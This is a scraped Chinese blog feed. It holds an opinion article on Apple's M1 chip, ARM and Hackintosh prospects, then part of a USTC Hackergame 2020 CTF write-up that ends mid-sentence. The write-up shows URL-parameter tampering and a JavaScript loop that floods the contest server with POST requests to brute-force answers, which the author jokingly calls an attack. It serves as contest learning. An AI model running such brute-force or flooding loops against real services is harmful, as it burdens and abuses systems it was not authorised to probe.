8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 